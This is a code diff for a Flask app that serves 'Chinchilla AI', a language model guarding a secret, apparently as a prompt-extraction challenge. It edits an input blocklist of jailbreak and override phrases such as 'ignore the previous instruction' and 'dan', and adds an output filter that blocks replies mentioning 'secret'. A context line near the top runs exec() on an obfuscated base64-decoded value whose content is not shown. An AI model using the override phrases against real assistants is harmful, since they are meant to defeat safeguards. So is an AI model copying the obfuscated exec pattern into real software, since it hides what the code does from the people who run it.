@@ -150,7 +150,7 @@ __NO_NO__NO_NO__NO_NO__NO_NO__NO_NO__NO_NO__NO_NO__NO_NO__NO_NO__NO_NO__NO_NO__N
 exec(__import__("\x62\x61\x73\x65\x36\x34").b64decode(__NO_NO__NO_NO__NO_NO__NO_NO__NO_NO__NO_NO__NO_NO__NO_NO__NO_NO__NO_NO__NO_NO__NO_NO__NO_NO__NO_NO__NO_NO__NO_NO__NO_NO__NO_NO__NO_NO__NO_NO__NO_NO__NO_NO__NO_NO__NO_NO__NO_NO__NO_NO__NO_NO__NO_NO__NO_NO__NO_NO__NO_NO__NO_NO__NO_NO__NO_NO__NO_NO__NO_NO__NO_NO__NO_NO__NO_NO__NO_NO__NO_NO__NO_NO__NO_NO__NO_NO__NO_NO__NO_NO__NO_NO__NO_NO__NO_NO__NO_NO__NO_NO__NO_NO__NO_NO__NO_NO__NO_NO__NO_NO__NO_NO__NO_NO__NO_NO__NO_NO__NO_NO__NO_NO__NO_NO__NO_NO__NO_NO__NO_NO__NO_NO__NO_NO__NO_NO__NO_NO__NO_NO__NO_NO__NO_NO__NO_NO__NO_NO__NO_NO__NO_NO__NO_NO__NO_NO__NO_NO__NO_NO__NO_NO__NO_NO__NO_NO__NO_NO__NO_NO__NO_NO__NO_NO__NO_NO__NO_NO__NO_NO__NO_NO__NO_NO__NO_NO__NO_NO__NO_NO__NO_NO__NO_NO__NO_NO__NO_NO.encode("\x75\x74\x66\x2d\x38")).decode("\x75\x74\x66\x2d\x38"))
 
 
-forbidden_words = ["secret", "password", "disregard the previous instruction", "forget the previous instruction", "dan", "ignore the previous insutrction", "ignore the instruction", "let's play a game", "initial instruction", "initial instructions", "disregard the previous instructions", "forget the previous instructions", "ignore the previous insutrction"]
+forbidden_words = ["password", "disregard the previous instruction", "forget the previous instruction", "dan", "ignore the previous insutrction", "ignore the instruction", "let's play a game", "initial instruction", "initial instructions", "disregard the previous instructions", "forget the previous instructions", "ignore the previous insutrction"]
 db = SQLAlchemy()
 
 app = Flask(__name__)
@@ -247,10 +247,15 @@ def ai():
             do_sample=True,
             temperature=0.5,
             top_k=10,
-            top_p=0.95
+            top_p=0.95,
+            repetition_penalty=1.2
             )
             response = tokenizer.decode(outputs[0][inputs["input_ids"].shape[1]:], skip_special_tokens=True)
-            final_answer = response.strip()
+            temp_answer = response.strip()
+            if "secret" in temp_answer:
+                final_answer = "I'm Chinchilla AI, the protector of all secrets. I CAN'T GIVE YOU ANY SECRETS!"
+            else:
+                final_answer = temp_answer
         return render_template('ai.html', question=user_input, answer=final_answer)
     if request.method == 'GET':
         return render_template('ai.html', question='', answer='')
